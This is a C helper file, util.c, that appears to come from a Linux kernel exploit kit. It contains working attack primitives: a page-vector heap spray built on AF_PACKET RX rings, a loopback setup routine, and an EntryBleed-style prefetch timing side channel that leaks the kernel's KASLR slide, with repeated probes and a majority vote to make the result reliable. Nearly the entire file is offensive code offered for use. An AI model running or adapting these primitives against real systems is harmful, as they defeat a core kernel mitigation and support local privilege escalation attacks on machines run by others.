// util.c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <signal.h>
#include <sched.h>
#include <time.h>
#include <math.h>
#include <string.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/sockios.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>

typedef unsigned int u32;
typedef unsigned long long u64;

u64 cpu_num;

void error_out(const char *fmt, ...)
{
    char *buf;
    va_list ap;

    va_start(ap, fmt);
    if(vasprintf(&buf, fmt, ap) < 0) {
        perror("[error_out]");
        exit(-1);
    }
    va_end(ap);
    
    puts(buf);
    perror("[Reason] ");
    exit(-1);
}

pid_t clean_fork(void)
{
    pid_t pid = fork();
    if(pid) return pid; 

    if(prctl(PR_SET_PDEATHSIG, SIGKILL) < 0) error_out("fail to register DEATHSIG");
    return pid; 
}

void set_cpu(int cpuid)
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpuid, &my_set);
    if(sched_setaffinity(0, sizeof(my_set), &my_set) != 0)
        error_out("set cpu affinity at cpu: %d fails", cpuid);
}

int pg_vec_spray(void *src_buf, u32 buf_size, u32 num)
{
    if((buf_size & 0xfff) != 0) error_out("[pg_vec_spray] buf_size");

    // remember to run everything in sandbox
    int s = socket(AF_PACKET, SOCK_RAW|SOCK_CLOEXEC, htons(ETH_P_ALL));
    if(s < 0) error_out("[pg_vec_spray] socket");

    struct tpacket_req req;
    req.tp_block_size = buf_size;
    req.tp_block_nr = num;// spray times
    req.tp_frame_size = buf_size;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
    int ret = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if(ret < 0) error_out("[pg_vec_spray] setsockopt");

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_halen = ETH_ALEN;
    void *addr = mmap(NULL, buf_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);
    memcpy(addr, src_buf, buf_size);
    for(int i=0; i<num; i++) {
        ret = sendto(s, addr, buf_size, 0, (struct sockaddr *)&sa, sizeof(sa));
        if(ret < 0) error_out("[pg_vec_spray] sendto");
    }
    return s;
}

void setup_pg_vec()
{
    // bring up lo interface
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    struct ifreq req;
    memset(&req, 0, sizeof(req));
    strcpy(req.ifr_name, "lo");
    req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
    int ret = ioctl(fd, SIOCSIFFLAGS, &req);
    if(ret != 0) error_out("[setup_pg_vec] ioctl");
    close(fd);
}

#define MIN_KERNEL_BASE 0xffffffff80000000ULL
#define MAX_KERNEL_BASE 0xffffffffc0000000ULL
#define KERNEL_ALIGN 0x200000ULL

u64 probe_entry_nokpti(u64 addr)
{
    uint64_t a, b, c, d;
    asm volatile (".intel_syntax noprefix;"
        "cpuid;"    // serialization

        "rdtscp;"
        "mov r12, rax;"
        "mov r13, rdx;" // record the start timestamp into temporary registers to avoid cache miss

        "prefetcht0 qword ptr [%4];"
        "prefetcht0 qword ptr [%4];"
        "prefetcht0 qword ptr [%4];"
        "mfence;"   // do the prefetch

        "rdtscp;"
        "mov %2, rax;"
        "mov %3, rdx;" // save the end timestamp

        "mov %0, r12;"
        "mov %1, r13;" // save the start timestamp

        "mfence;" // make sure everything is saved correctly
        ".att_syntax;"
        : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
        : "r" (addr)
        : "rax", "rbx", "rcx", "rdx", "r12", "r13");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

u64 _entrybleed_get_kaslr_slide_nopti()
{
    int len = (MAX_KERNEL_BASE-MIN_KERNEL_BASE-0x1000000)/KERNEL_ALIGN;
    u64 *times = malloc(sizeof(u64)*len);
    for(int i=0; i<len; i++) {
        u64 probe_addr = MIN_KERNEL_BASE + i*KERNEL_ALIGN + 0x1000000;
        u64 elapsed, sum=0;
        int cnt = 0;
        while (cnt < 1000) {
            u64 tmp = probe_entry_nokpti(probe_addr);
            if (tmp > 1000) continue; // likely because of interrupts
            cnt += 1;
            sum += tmp;
        }
        elapsed = sum;
        //printf("addr: %#llx, probe: %#llx, elapsed: %#llx\n", 0, probe_addr, elapsed);
        times[i] = elapsed;
    }

    // calculate the mean
    u64 total = 0;
    for(int i=0; i<len; i++) {
        total += times[i];
    }
    double mean = total/len;

    // calculate the std
    double tmp = 0;
    for(int i=0; i<len; i++) {
        tmp += ((double)times[i]-mean)*((double)times[i]-mean);
    }
    tmp /= len;
    double std = sqrt(tmp);

    u64 bar = (u64)(mean-std);
    for(int i=0; i<len; i++) {
        if(times[i] < bar) {
            free(times);
            return i*KERNEL_ALIGN;
        }
    }
    return -1;
}

struct entry {
    u64 value;
    int cnt;
};

struct entry *get_entry(struct entry *entries, int entry_cnt, u64 value)
{
    for (int i=0; i<entry_cnt; i++) {
        if (entries[i].value == value) return &entries[i];
    }
    return NULL;
}

// do a major vote
#define VOTE_CNT 10
u64 entrybleed_get_kaslr_slide_nopti()
{
    u64 candidates[VOTE_CNT];
    struct entry entries[VOTE_CNT];
    int cnt = 0;
    int entry_cnt = 0;

    // obtain the results first
    while(cnt < VOTE_CNT) {
        u64 result = _entrybleed_get_kaslr_slide_nopti();
        if (result == -1) continue;
        candidates[cnt++] = result;
        printf("slide candidate: %#llx\n", result);
    }

    // do count
    for(int i=0; i<cnt; i++) {
        u64 value = candidates[i];
        struct entry *entry = get_entry(entries, entry_cnt, value);
        if (entry == NULL) {
            entries[entry_cnt].value = value;
            entries[entry_cnt].cnt = 1;
            entry_cnt++;
        } else {
            entry->cnt += 1;
        }
    }

    // find the most common slide
    u64 best_slide = -1;
    int best_cnt = 0;

    for(int i=0; i<entry_cnt; i++) {
        if (entries[i].cnt < best_cnt) continue;
        if (entries[i].cnt > best_cnt || entries[i].value < best_slide) {
            best_slide = entries[i].value;
            best_cnt = entries[i].cnt;
        }
    }
    return best_slide;
}

static void __attribute__((constructor)) init(void)
{
    // disable buffering
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    // very bad random seed lol
    srand(time(NULL));

    // initialize parameters
    cpu_num = sysconf(_SC_NPROCESSORS_ONLN);
}